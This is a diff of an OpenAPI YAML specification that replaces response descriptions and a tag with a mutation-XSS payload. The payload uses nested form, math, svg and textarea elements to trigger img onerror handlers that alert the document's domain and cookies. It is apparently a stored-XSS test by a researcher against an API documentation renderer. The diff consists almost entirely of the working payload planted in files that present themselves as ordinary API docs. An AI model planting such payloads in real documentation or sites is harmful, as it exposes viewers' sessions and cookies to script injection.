@@ -18,9 +18,9 @@ paths:
     get:
       responses:
         '200':
-          description: No response was specified
+          description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(document.domain)><img src=x onerror=alert(document.cookie)><img onerror=alert(1) src=javascript:alert(1);>"></form>
       tags:
-        - SYARIF07_XSS_D
+        - SYARIF07_XSS_D<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(document.domain)><img src=x onerror=alert(document.cookie)><img onerror=alert(1) src=javascript:alert(1);>"></form>
       operationId: findAccounts
       summary: Finds all accounts
   '/hack/hachid/{id}':
@@ -35,4 +35,4 @@ paths:
           type: integer
       responses:
         '200':
-          description: No response was specified
+          description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(document.domain)><img src=x onerror=alert(document.cookie)><img onerror=alert(1) src=javascript:alert(1);>"></form>
